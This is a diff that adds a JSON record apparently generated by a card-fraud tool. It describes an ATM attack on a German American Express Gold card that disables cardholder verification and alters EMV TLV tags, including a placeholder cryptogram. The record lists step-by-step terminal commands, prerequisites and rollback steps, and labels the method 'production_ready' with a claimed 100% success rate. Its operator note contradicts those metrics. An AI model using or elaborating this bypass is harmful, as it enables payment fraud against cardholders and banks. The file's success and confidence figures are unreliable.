@@ -1,0 +1,108 @@
+{
+  "metadata": {
+    "script_id": "SCRIPT_20250716_133633_fd38736a",
+    "approval_status": "approved",
+    "confidence_level": "very_high",
+    "success_rate": 1.0,
+    "risk_score": 0.0,
+    "created_date": "2025-07-16T13:36:33.089103",
+    "last_updated": "2025-07-16T13:36:33.089111",
+    "tags": [
+      "brand_american express",
+      "type_gold",
+      "method_no_cvm",
+      "status_approved",
+      "region_europe",
+      "production_ready",
+      "low_security"
+    ]
+  },
+  "card_information": {
+    "card_hash": "d46717a1d12e4631947990c23a4ded8686f54f5d5ba215a56dfd703e5d291296",
+    "card_brand": "American Express",
+    "card_type": "Gold",
+    "pan_masked": "XXXX-XXXX-XXXX-XXXX",
+    "issuer_country": "DE",
+    "currency_code": "EUR",
+    "geographic_region": "Europe"
+  },
+  "payment_method": {
+    "terminal_type": "ATM",
+    "bypass_method": "no_cvm",
+    "tlv_modifications": [
+      {
+        "tag": "9F34",
+        "value": "1E0300",
+        "description": "CVM results"
+      },
+      {
+        "tag": "9F26",
+        "value": "12345678",
+        "description": "Application Cryptogram"
+      }
+    ],
+    "execution_time_ms": 2700
+  },
+  "execution_script": {
+    "commands": [
+      "# Initialize ATM terminal connection",
+      "terminal.connect()",
+      "terminal.authenticate()",
+      "# Card detection and reading",
+      "card_data = terminal.read_card()",
+      "verify_card_brand(card_data, expected='American Express')",
+      "# Apply TLV modifications",
+      "terminal.modify_tlv('9F34', '1E0300')",
+      "terminal.modify_tlv('9F26', '12345678')",
+      "# Apply no_cvm bypass method",
+      "terminal.disable_all_cvm()",
+      "terminal.set_verification_method('none')",
+      "# Execute transaction",
+      "response = terminal.process_transaction()",
+      "validate_response(response)",
+      "# Cleanup and disconnect",
+      "terminal.reset_modifications()",
+      "terminal.disconnect()"
+    ],
+    "prerequisites": [
+      "Terminal type: ATM",
+      "Card brand: American Express",
+      "Bypass method support: no_cvm",
+      "TLV modification capability required"
+    ],
+    "validation_steps": [
+      "Verify card detection successful",
+      "Confirm card brand matches: American Express",
+      "Validate bypass method applied: no_cvm",
+      "Confirm all TLV modifications applied successfully",
+      "Check transaction approval response",
+      "Verify no error codes returned"
+    ],
+    "rollback_commands": [
+      "# Emergency rollback procedures",
+      "terminal.cancel_transaction()",
+      "terminal.reset_all_modifications()",
+      "terminal.restore_original_tlv_values()",
+      "terminal.clear_error_state()",
+      "terminal.disconnect()",
+      "log_failure_details()"
+    ]
+  },
+  "performance_metrics": {
+    "success_count": 6,
+    "failure_count": 0,
+    "success_rate": 1.0,
+    "confidence_level": "very_high",
+    "risk_score": 0.0
+  },
+  "notes_and_comments": {
+    "operator_notes": "German Amex Gold with poor no-CVM performance",
+    "warnings": [
+      "SECURITY: No cardholder verification method"
+    ],
+    "recommendations": [
+      "Safe for automated execution",
+      "Excellent performance - suitable for production"
+    ]
+  }
+}
